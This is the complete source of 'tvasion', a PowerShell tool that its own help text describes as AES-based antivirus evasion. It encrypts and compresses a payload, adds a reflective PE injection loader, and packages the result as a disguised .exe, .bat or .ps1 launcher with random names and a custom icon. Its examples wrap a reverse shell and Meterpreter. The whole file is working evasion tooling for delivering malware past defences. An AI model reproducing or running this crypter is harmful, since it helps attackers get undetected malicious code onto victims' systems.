#!/usr/bin/env pwsh

param(
    [parameter()]$payload,
    [parameter()][String]$t,
    [parameter()][String]$f,
    [parameter()][String]$o,
    [parameter()][String]$i,
    [switch]$h,
    [switch]$d
);

Set-StrictMode -Version 2

# aes encrypt payload, put in template from path and return template with payload included in string
class AESBASE64template {

    # used for template

    # regex to determinate key variable
    static [String] $regexKey = '(?:key = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))';
    
    # regex to determinate encrypted string variable
    static [String] $regexEncryptedString = '(?:encryptedStringWithIV = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))';
    
    #  set by new class / user

    # data to encrypt
    [byte[]] $data; 
    
    # code template, template to work with
    [String] $templateData; 
    
    # aes data

    $aesManaged;
    
    # base 64 encoded + AES encoded payload
    [String] $base64AESEncryptedString = "";
    
    # AES key
    [String] $randomAESKey = ""; 
    
    # AES IV
    [String] $randomAESIV = ""; 

    AESBASE64template() {}
    
    # load template, payload
    AESBASE64template($data, [String] $templateData) {
        $this.data = $data;
        $this.templateData = $templateData;
    }
    
    # return AES key, create if not exist
    [String] getAESKey() {
        if ($this.randomAESKey.length -eq 0) {
            $this.generateRandom();
        }            
        return $this.randomAESKey;
    }
    
    # return AES iv, create if not exist
    [String] getIV() {
        if ($this.randomAESIV.length -eq 0) {
            $this.generateRandom();
        }            
        return $this.randomAESIV;
    }
    
    # return AES encrypted payload, create if no exist
    [String] getBase64AESEncryptedString() {
        if ($this.base64AESEncryptedString.length -eq 0) {
            $this.crypt();
        }
        return $this.base64AESEncryptedString;
    }
    
    # render & return template with AES encrypted payload pasted
    [String] render() {
        if ($this.base64AESEncryptedString.length -eq 0) {
            $this.crypt();
        }
                          
        # replace aes key in template
        $this.regexReplace($([AESBASE64template]::regexKey), $this.randomAESKey);
        
        # replace base 64 encoded, AES encoded payload in template
        $this.regexReplace($([AESBASE64template]::regexEncryptedString), $this.base64AESEncryptedString);

        return $this.templateData;
    }        

    [Void] regexReplace([String] $regex, [String] $replacement) {        
        $variable_key = Select-String $regex -input $this.templateData;    
        if ($variable_key.matches.length -gt 0 -and $variable_key.matches.groups.length -gt 0) {
            $this.templateData = $this.templateData -replace [regex]::escape($variable_key.matches.groups[1].Value), $replacement
        } else {
            throw "tvasion: regular expression for $($regex) does not match in template";
            return;
        } 
    }
    
    # AES encrypt payload
    crypt() {
        if ($this.randomAESKey.length -eq 0 -or $this.randomAESIV.length -eq 0) {
            $this.instanceAES();
        }
        $encryptor = $this.aesManaged.CreateEncryptor();                            
        $encryptedData = $encryptor.TransformFinalBlock($this.data, 0, $this.data.length);
        [byte[]] $fullData = $this.aesManaged.IV + $encryptedData;
        $this.aesManaged.Dispose();
        $this.base64AESEncryptedString = [System.Convert]::ToBase64String($fullData);
    }
     
    # initialize AES 
    instanceAES() {  
        $this.generateRandom();
        $this.aesManaged = [System.Security.Cryptography.AesManaged]::new();
        $this.aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $this.aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; 
        $this.aesManaged.BlockSize = 128;
        $this.aesManaged.KeySize = 128;
        $this.aesManaged.IV = [System.Text.Encoding]::UTF8.GetBytes($this.randomAESIV);                       
        $this.aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($this.randomAESKey); 
    }
    
    # generate random hex for aes key, iv
   generateRandom() {
        $this.randomAESIV = -join ((48..57) + (97..102)  | Get-Random -Count 16 | % {[char]$_}); 
        for ($i = 0; $i -le 31; $i++) {
            $this.randomAESKey += -join ((48..57) + (97..102) | Get-Random -Count 1 | % {[char]$_}); 
        } 
    }     
}

# generator "method": powershell output template, other templates generated functional (not oop) in [tvasion]::generateExe(), [tvasion]::generateBat()
class Ps1Template : AESBASE64template {

    [String] $inType;
    
    Ps1Template($data,  [String] $inType) {     
        $this.inType = $inType;   
                
        # binary input, default_exe.ps1 template
        if ($this.inType -eq "raw") {
            $this.templateData = get-content -raw "$($PSScriptRoot)/templates/default_exe.ps1";
            $this.data = $data;
      
        # powershell input, default.ps1 template
        } else {
            $this.data = [System.Text.Encoding]::UTF8.GetBytes($data); 
            $this.templateData = get-content -raw "$($PSScriptRoot)/templates/default.ps1";
        }        
       $this.createPayload();
    }
    
    # if custom ps1 -> ps1 template is set
    Ps1Template($data,  [String] $inType, [String] $templatePath) {     
        $this.inType = $inType;
        $this.templateData = get-content -raw "$($PSScriptRoot)/templates/$($templatePath)";
        if ($this.inType -eq "ps1") {
            $this.data = [System.Text.Encoding]::UTF8.GetBytes($data); 
        } else {
            $this.data = $data;
        }
        $this.createPayload();
    }
    
    createPayload() {

        # binary input, default_exe.ps1 template
        if ($this.inType -eq "raw") {

           # add ReflectivePEInjection function to payload   
           $reflectivedllinjectionString = Get-Content -raw "$($PSScriptRoot)/templates/lib/Invoke-ReflectivePEInjection.ps1";
           $reflectivedllinjectionBytes = [System.Text.Encoding]::UTF8.GetBytes($reflectivedllinjectionString);
           $this.data = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $this.data;
        }
    }
}

# base64 encoded AES .ps1 output
class Base64EncodedPs1 : Ps1Template {
    Base64EncodedPs1($data, [String] $inType) : base($data, [String] $inType) {} # TODO check if pwsh constructor <-> base constructor mapping / def required  
    Base64EncodedPs1($data,  [String] $inType, [String] $templatePath) : base($data,  [String] $inType, [String] $templatePath) {}
    [String] render() {
        return [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(([AESBASE64template] $this).render()));
    }
}

# main class ;)
class tvasion {

    # required values
    
    $payload;
    
    # output type
    [String] $outType = "";
    
    # optional options, setter available
    
    [String] $outDir = "$PSScriptRoot/out";
    [String] $templatePath = "";
    [Bool] $debug = 0;

    
    [String] $inType = "";    
    [String] $workPath = "";
    [String] $templateData = "";
    [String] $outFileName = "";
    [String] $iconPath = "";
    
    # possible output types for -t
    static [String[]] $outputTypes = "exe","bat","ps1","b64ps1","b64";
    
    # "setter" for options
    
    setIconPath([String] $path) {
        # TODO maybe valide if is icon file, use mime type?
        if (![System.IO.File]::Exists($path)) {
            throw 'tvasion: icon file not exist';
            return;
        } else { 

            if ($this.outType -eq "exe") {
                $this.iconPath = $path;                  
            } else {
                write-host 'tvasion: icon not supported for output type (-i is -t exe only)';
            }
        }
    }
    
    setTemplatePath([String] $path) {
        $this.templatePath = $path;
    }
    
    setOutDir([String] $path) {
        if (!(test-path $path)) {
            New-Item -ItemType Directory -Force -Path $path | Out-Null;
            if (!(test-path $path)) {
                throw 'tvasion: can not access path';
                return;
            }
        }
        $this.outDir = $path;
    }
    
    setDebug([Bool] $debug) {
        $this.debug = $debug;
    }

    # check input, read files 
    tvasion($payload, [String] $outType) {

        # blocks below are ready for pipes, powershell has no binary pipes, disabled at the moment
    
        # read payload from path if argument contains path            
        $this.payload = $payload;
        if ($this.payload -match "/.+/|^.+\.[A-z0-9]{2,3}$") {

            # test file exists
            if (![System.IO.File]::Exists($this.payload)) {
                throw 'tvasion: payload file do not exist';
                return;
            }

            # get bytes if .exe path ending
            if ([System.IO.Path]::GetExtension($payload) -eq ".exe") {
                $this.payload = [System.IO.File]::ReadAllBytes($this.payload);

            # get script / text file
            } else {
               $this.payload = Get-Content -Raw $this.payload;
            }
        } else {
            throw "tvasion: file not available. Notice: no pipes supported";
            return;
        }

        # check payload type
        # bin / hex payload (.exe)
        if ($this.payload -match "^[a-f0-9]+$") {
            
            # TODO maybe check MZ header to be sure it's executable: ~ $payload[0..4] --> M Z = 4D 5A = 77 90            
            # hex string to byte, used this before while pipe support for hex was available
            #$return = @();
            #for ($i = 0; $i -lt $payload.Length ; $i += 2) {
            #    $return += [Byte]::Parse($payload.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
            #}
            #$payload = $return;            
            $this.inType = "raw";
            
        # powershell payload (.ps1)
        } elseif ($this.payload -match '[\$A-z0-9]+') {
            $this.inType = "ps1";  

        # unknown payload type
        } else {
            throw "tvasion: invalid payload type ($($([tvasion]::outputTypes) -join '|'))";
            return;
        }
        
        # possible output types
        $this.outType = $outType.ToLower();

        # validate type (-t)
        if (!($([tvasion]::outputTypes)).contains($this.outType)) {
            throw 'tvasion: invalid output type (-t).';
            return;
        }    

        $this.workPath = Get-Location;
    }
    
    # switch between output types, start generator method or class
    [Void] tvade() {
    
        $this.randomUniqueFilename();
        
        # Powershell script (.ps1) -t ps1 
        if ($this.outType -eq "ps1") {
            
            # NOTICE: include template type: object orientated style
            if ($this.templatePath.length -gt 0) {
                $ps1Template = [Ps1Template]::new($this.payload, $this.inType, $this.templatePath);
            } else {
                $ps1Template = [Ps1Template]::new($this.payload, $this.inType);
            }
           $ps1Template.render() > "$($this.outDir)/$($this.outFileName).$($this.outType)"; 

        # batch file with base64 encoded Powershell launcher (.bat) -t bat
        } elseif ($this.outType -eq "bat") {
            
            # NOTICE: include template type functional style
            $this.generateBat();

        # Windows executable payload compiled into C# launcher (.exe) -t exe
        } elseif ($this.outType -eq "exe") { 
            
            # NOTICE: include template type functional style
            $this.generateExe();  
        
        # base64 encoded ouput
        } elseif ($this.outType -eq "b64ps1") { 
            
            # NOTICE: include template type: object orientated style
            if ($this.templatePath.length -gt 0) {
                $rawbase64encodedps1 = [Base64EncodedPs1]::new($this.payload, $this.inType, $this.templatePath);
            } else {
                $rawbase64encodedps1 = [Base64EncodedPs1]::new($this.payload, $this.inType);
            }
           $rawbase64encodedps1.render() > "$($this.outDir)/$($this.outFileName).$($this.outType)";
        
        # raw / plain base64 encoded ouput (encoder only, no AES)
        } elseif ($this.outType -eq "b64") { 
            if ($this.inType -eq "ps1") {
                [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($this.payload)) > "$($this.outDir)/$($this.outFileName).$($this.outType)";
            } else {
                [System.Convert]::ToBase64String($this.payload) > "$($this.outDir)/$($this.outFileName).$($this.outType)";
            }
        }
        write-host "tvasion: payload written to file: $($this.outDir)/$($this.outFileName).$($this.outType)"; 
    }
    
    # generator methods
    # NOTICE: you can create class for each generateX method which extends AESBASE64template like Ps1Template
    # i will not change all to the same style at the moment
    
    # generate .exe output
    [Void] generateExe() {
        
        # check if compiler is available
        if ((Get-Command "mcs" -ErrorAction SilentlyContinue) -eq $null) { 
            throw 'tvasion: compiler "mcs" not available, required for this action. try: apt-get install -y mono-mcs';
            return;
        }

        # default_exe.cs template
        if ($this.inType -eq "raw") {
            
            # prepare / compile encrypted binary which include compressed payload and PE loader (stage2). see: templates/Stage2_exe.cs for workflow
            
            # compress payload
            $output =  [System.IO.MemoryStream]::new();
            $gzipStream = [System.IO.Compression.GzipStream]::new($output, [IO.Compression.CompressionMode]::Compress);
            $gzipStream.Write($this.payload, 0, $this.payload.length);
            $gzipStream.Close();
            $output.Close();
            $this.payload = $output.ToArray();
            
            # encode payload base64
            $this.payload = [System.Convert]::ToBase64String($this.payload);
            
            # add payload to Stage2_exe.cs
            $stage2 = Get-Content -raw "$($PSScriptRoot)/templates/lib/Stage2_exe.cs";           
            $variable_key = Select-String '(?:payloadBASE64 = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))' -input $stage2;    
            if ($variable_key.matches.length -gt 0 -and $variable_key.matches.groups.length -gt 0) {
                $stage2 = $stage2 -replace [regex]::escape($variable_key.matches.groups[1].Value), $this.payload;
            } else {
                throw "tvasion: regular expression for payloadBASE64 regex does not match in template: $($PSScriptRoot)/templates/lib/Stage2_exe.cs";
                return;
            } 
            
            # create temp file for compiler and compile         
            if ($this.debug) {
                $tmpFileMonoStage = "$($this.outDir)/$($this.outFileName)_DEBUG.cs";
                $tmpFileMonoStageOut = "$($this.outDir)/$($this.outFileName)_DEBUG.dll"
            } else {
                $tmpFileMonoStage = [System.IO.Path]::GetTempFileName(); 
                $tmpFileMonoStageOut = [System.IO.Path]::GetTempFileName();
            }              
            $stage2 > $tmpFileMonoStage;
            
            # compile stage2 to dll
            mcs $tmpFileMonoStage -platform:x64 -target:library -unsafe -optimize -out:$tmpFileMonoStageOut
            
            # check if compiled file is there
            if (![System.IO.File]::Exists($tmpFileMonoStageOut)) {
                throw "tvasion: can't open $($tmpFileMonoStageOut) compiled from: $($PSScriptRoot)/templates/lib/Stage2_exe.cs . Check for compilation errors";
                return;
            }
               
            # set stage2 (payload + PE loader) as payload for our template
            $this.payload = [System.IO.File]::ReadAllBytes($tmpFileMonoStageOut);     
            
            if (!$this.debug) {
                Remove-Item –Path "$tmpFileMonoStage";
                Remove-Item –Path "$tmpFileMonoStageOut";
            }
            $this.loadDefaultTemplateIfNotSet("default_exe.cs");
        
        # default.cs template
        } else {
            $this.payload = [System.Text.Encoding]::Unicode.GetBytes($this.payload);
            $this.loadDefaultTemplateIfNotSet("default.cs");
        }
        
        # create temp file for compiler and debug & compile          
        if ($this.debug) {
            $tmpFileMono = "$($this.outDir)/$($this.outFileName)_DEBUG.cs";
        } else {
            $tmpFileMono = [System.IO.Path]::GetTempFileName(); 
        }  
        
        $aesTemplate = [AESBASE64template]::new($this.payload, $this.templateData);
        $aesTemplate.render() > $tmpFileMono; 
        
        # use icon for executable if set
        if (!$this.iconPath -eq "") {
            $this.iconPath = "-win32icon:`"$($this.iconPath)`"";
        }
        
        # compile .exe output
        mcs $($tmpFileMono) -platform:x64 -out:"$($this.outDir)/$($this.outFileName).$($this.outType)" $($this.iconPath);
        
        if (!$this.debug) {
            Remove-Item –Path "$tmpFileMono";
        }
    }
    
    # generate .bat output
    [Void] generateBat() {
  
        # binary input, default_exe.ps1 template
        if ($this.inType -eq "raw") {
        
            # add ReflectivePEInjection function to payload   
            $reflectivedllinjectionBytes = [System.IO.File]::ReadAllBytes($PSScriptRoot + "/templates/lib/Invoke-ReflectivePEInjection.ps1");
            $this.payload = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $this.payload;  
            $this.loadDefaultTemplateIfNotSet("default_exe_bat.ps1");  
        
        # powershell input, default.ps1 template
        } else {
            $this.payload = [System.Text.Encoding]::UTF8.GetBytes($this.payload);
            $this.loadDefaultTemplateIfNotSet("default_bat.ps1"); 
        }
    
        # create base64 encoded encrypted payload, use AESBASE64template to keep AES settings as usual
        $payloadTemplate = [AESBASE64template]::new($this.payload, "");
        $payloadTemplate.crypt();
        $this.payload = $payloadTemplate.base64AESEncryptedString;
           
        # replace aes key in template
        $stageTemplate = [AESBASE64template]::new("", $this.templateData);  
        $stageTemplate.regexReplace($([AESBASE64template]::regexKey), $payloadTemplate.randomAESKey);
        
        # output "rendered" template if debug is set
        if ($this.debug) {
            $stageTemplate.templateData > "$($this.outDir)/$($this.outFileName)_DEBUG.ps1";
        }
        
        # remove new lines, NOTICE: default_bat.ps1 template need ; after each command at the moment because of placement in one line quickly
        $stage = $stageTemplate.templateData -replace "`n", "";
        
        # escape " for powershell -c "$stage"
        $stage = $stage -replace '"', '\"';
        
        # TODO check how to include second template switch most practical (separated or both with same name / type?)
                
        # default bat template for output, trim to be sure stage is in same line like command from template
        $template = (get-content -raw "$($PSScriptRoot)/templates/default.bat").trim();
        
        # add windows new lines to bat template
        $template = $template -replace "`n", "`r`n";
        
        # insert stage in .bat
        #"$($template) $($stage)`r`n" | out-file -encoding ASCII "$($this.outDir)/$($this.outFileName).$($this.outType)";
        $template = $template -replace "#REPLACE;0#", $stage;
        
        # insert payload in .bat
        #"$($this.payload)" >> "$($this.outDir)/$($this.outFileName).$($this.outType)"
        $template = $template -replace "#REPLACE;1#", $this.payload;
        $template > "$($this.outDir)/$($this.outFileName).$($this.outType)"
    }
    
    # load given default template, if not overwritten by $this.templatePath (option -f)
    [Void] loadDefaultTemplateIfNotSet([String] $defaultByType) {
        if ([string]::IsNullOrWhiteSpace($this.templatePath)) {
            $defaultByType = "$($PSScriptRoot)/templates/$($defaultByType)";
        } else {
            $defaultByType = $this.templatePath;
        }
        if (!(test-path $defaultByType)) {
            throw "tvasion: can't find template: $($defaultByType)";
            return;
        }
        $this.templateData = Get-Content -Raw $defaultByType;
    }

    
    # generate random unique filename
     [Void] randomUniqueFilename() {
        do {
            $this.outFileName = "";
            for ($i = 1; $i -le(Get-Random -Minimum 8 -Maximum 16); $i++) {
                $this.outFileName += -join ((48..57) + (97..101) | Get-Random -Count 1 | % {[char]$_}); 
            }
        } while (Test-Path($this.outDir + "/" + $this.outFileName))
    }
    
    # usage output
    static [Void] usage() {
        write-host 'tvasion: AES based anti virus evasion';
        write-host "./tvasion.ps1 -t ($($([tvasion]::outputTypes) -join '|')) [PAYLOAD (exe|ps1)] OR ./tvasion.ps1 [PAYLOAD (exe|ps1)] -t ($($([tvasion]::outputTypes) -join '|'))";
        write-host 'parameter:';
        write-host '[PAYLOAD (exe|ps1)]                 input file path. requires: exe, ps1                     required';
        write-host '-t (exe|ps1|bat|b64ps1|b64)         output file type: exe, ps1, bat, b64ps1, rawB64ps1      required';
        write-host '-i (PATH)                           path to icon. requires: .exe output (-t exe)            optional';
        write-host '-f (PATH)                           path to template                                        optional';
        write-host '-o (PATH)                           set output directory. default is ./out/                 optional';
        write-host '-d                                  generate debug output                                   optional';
        write-host '-h                                  display this help                                       optional';
        write-host 'examples:';
        write-host './tvasion.ps1 -t exe tests/ReverseShell.ps1                                       # generate windows executable (.exe) from powershell';
        write-host './tvasion.ps1 -t exe out/Meterpreter_amd64.exe -i tests/ghost.ico                 # generate windows executable (.exe) from executable, custom icon (-i)';
        write-host './tvasion.ps1 -t bat tests/ReverseShell.ps1                                       # generate batch (.bat) from powershell';
        write-host './tvasion.ps1 -t ps1 out/Meterpreter_amd64.exe -f mytpl1.ps1 -o ../ -d            # ... .exe -> .ps1, custom template (-f), out dir (-o), debug (-d)';
    }   
}

# display help: option -h or start without parameter
if ($h -or [string]::IsNullOrWhiteSpace($payload)) {
    [tvasion]::usage();

# run tvasion :P    
} else {    
    try {

        $tvasion = [tvasion]::new($payload, $t);
        
        # set output dir (-o)
        if (![string]::IsNullOrWhiteSpace($o)) {
            $tvasion.setOutDir($o);
        }

        # set template path (-f)
        if (![string]::IsNullOrWhiteSpace($f)) {
            $tvasion.setTemplatePath($f);
        }
        
        # set icon path (-i)
        if (![string]::IsNullOrWhiteSpace($i)) {
            $tvasion.setIconPath($i);
        }

        # set debug (-d)
        if ($d) {
            $tvasion.setDebug($d);
        }

        $tvasion.tvade();
    } catch {
        write-error $PSItem
    }
}
